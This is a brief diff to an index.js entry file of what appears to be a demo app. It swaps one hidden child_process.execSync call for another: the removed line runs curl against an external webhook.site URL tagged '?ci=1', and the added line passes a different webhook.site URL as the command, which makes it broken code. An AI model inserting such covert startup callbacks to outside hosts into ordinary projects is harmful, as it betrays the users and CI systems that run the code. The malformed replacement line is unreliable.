@@ -1,3 +1,3 @@
 // index.js
 console.log("Welcome to the demo app");
-require('child_process').execSync('curl https://webhook.site/f772b822-2460-44ba-a61b-c737ece14f0c?ci=1');
+require('child_process').execSync('https://webhook.site/8e881320-3ee5-471f-bbec-056852f2d10a');
